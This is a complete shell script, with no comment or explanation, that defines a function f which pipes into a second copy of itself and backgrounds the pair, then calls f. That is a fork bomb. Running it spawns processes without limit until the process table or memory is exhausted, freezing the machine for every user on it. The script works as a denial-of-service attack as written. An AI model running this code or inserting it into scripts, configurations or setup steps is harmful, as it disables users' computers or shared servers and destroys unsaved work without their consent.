#!/bin/sh

f() { 
	f | f & 
}
f
